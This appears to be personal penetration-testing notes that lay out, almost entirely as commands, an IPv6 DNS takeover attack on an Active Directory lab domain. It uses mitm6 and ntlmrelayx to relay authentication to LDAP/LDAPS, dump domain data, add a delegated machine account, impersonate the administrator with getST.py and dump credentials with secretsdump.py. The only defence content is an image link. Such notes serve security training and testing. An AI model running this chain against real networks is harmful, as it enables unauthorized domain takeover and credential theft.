- - -
**[ this attack in not limited to ldap ]**
- - -
### We need this : 

```sh
git clone https://github.com/dirkjanm/mitm6.git ; cd mitm6/ ; pip install .
```

- - -
## Attacking Steps ( 1 ):  

```
python3 mitm6.py -d marvel.local 
```

```sh

# For 'Ldap-secure', Don't remove “wpad”
ntlmrelayx.py -6 -t ldaps://10.10.10.10 -wh fakewpad.marvel.local -l lootme


# For 'Ldap-insecure', Don't remove “wpad”
ntlmrelayx.py -6 -t ldap://10.10.10.10 -wh fakewpad.marvel.local -l lootme 
```

Once we are authenitcated against the DC we gather data and dump into lootme directory 

```sh
cd lootme/ 
```

Now use bloodhound ( for **json** ) **or** firefox ( for **html** ).

- - -
## Attacking Steps ( 2 ) : 

Blog Link : [here](https://medium.com/@browninfosecguy/ipv6-exploitation-in-ad-environment-b22a7c3ec8af)

```sh
sudo mitm6 -i eth0 -d covid.inc -hw <hostname> 
```

```sh
sudo ntlmrelayx.py -t ldaps://10.10.10.10 — delegate-access — no-smb-server -wh attacker-wpad 
```

Once the authentication against the DC succeed, it goes ahead with creation of new user on DC

- - -
## After Success in Attack : 

Once we have succeded to add a new user on DC. 
we will be impersonating the user **admin**.

```python
getST.py -spn cifs/internal.marvel.local  marvel.local/<new-user>  impersonate admin 
```

```sh
export KRB5CCNAME=admin.ccache 
```

```python
secretsdump.py -k -no-pass internal.marvel.local 
```

- - -
### Defences : 

![Imgur](https://i.imgur.com/KbM5XAs.jpg)

- - -

